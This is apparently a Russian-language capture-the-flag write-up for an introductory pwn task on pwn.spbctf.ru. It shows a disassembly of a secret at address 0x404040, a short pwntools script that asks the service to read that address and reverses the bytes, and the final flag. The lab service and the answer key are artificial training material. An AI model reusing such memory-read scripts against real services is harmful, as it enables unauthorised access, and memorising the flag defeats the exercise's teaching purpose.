[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn5_AR1)
Описание:
Я спрятал секрет, но у тебя есть шанс найти его самостоятельно. Флаг в формате spbctf{0xчисло_в_хексах}
`nc 109.233.56.90 11681`
**[ar1.elf](https://pwn.spbctf.ru/files/www/AR1/ar1.elf)**

Флаг лежит по адресу 0x404040, также в солвере необходимо учесть, что байты в памяти лежат в обратном порядке.
```
.data:0000000000404040                         public secret
.data:0000000000404040 secret                  db  11h
.data:0000000000404041                         db  11h
.data:0000000000404042                         db  11h
.data:0000000000404043                         db  11h
.data:0000000000404044                         db  11h
.data:0000000000404045                         db  11h
.data:0000000000404046                         db  11h
.data:0000000000404047                         db  11h
.data:0000000000404047 _data                   ends
```

Эксплоит:
``` python
io = start()

io.sendlineafter(b': ', b'404040')
io.recvuntil(b': ')
flag = io.recv(8)[::-1].hex()
print(flag)

io.interactive()
```

Запуск:
![Pasted image 20260408100141](../../../../z.%20Images/Pasted%20image%2020260408100141.png)

Ответ: `spbctf{0x2176331165239512}`